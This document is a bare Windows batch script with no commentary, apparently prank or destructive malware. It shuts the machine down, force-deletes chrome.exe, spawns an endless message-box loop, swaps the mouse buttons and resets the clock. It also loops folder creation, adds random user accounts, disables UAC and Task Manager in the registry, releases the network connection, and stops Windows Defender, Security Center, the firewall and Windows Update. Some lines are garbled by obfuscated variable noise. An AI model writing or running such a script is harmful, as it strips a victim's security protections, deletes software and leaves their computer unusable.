:user
:folders

@echo off
shutdown -s -t 00 -c "000"
DEL /F /S /Q /A "chrome.exe"
start notepad.exe
echo do>>msg.vbs
echo Msgbox"Run!!!",0+-1,"Your Next">>msg.vbs
echo loop>>msg.vbs
start msg.vbs
RUNDLL32 USER32.DLL,SwapMouseButton
date 22/08/2014
time 06:06:06
mkdir %random%
goto folders
net user %random% /add
goto user
@Set RegistyEditCmd=Cmd /k Reg Add
@Set HiveSysKey=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
@%RegistyEditCmd% "%HiveSysKey%" /v "EnableLUA" /t "REG_DWORD" /d "0" /f > nul
@Echo off & @@Break Off
Ipconfig / release
%jUmP%E%nD%c%onFiG%h%IdE%o%P% h%aRv%%aRd%A%T%%cHe%cK%HappY%3D b%aLLo0Ns%Y%eS% m3Ga!?!
P%ReSs%%IE%AuS%ExPloR%e%r% > nul.%TempInternetRelease%
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
net stop "SDRSVC"
net stop "WinDefend"
taskkill /f /t /im "MSASCui.exe"
net stop "security center"
net stop sharedaccess
netsh firewall set opmode mode-disable
net stop "wuauserv"
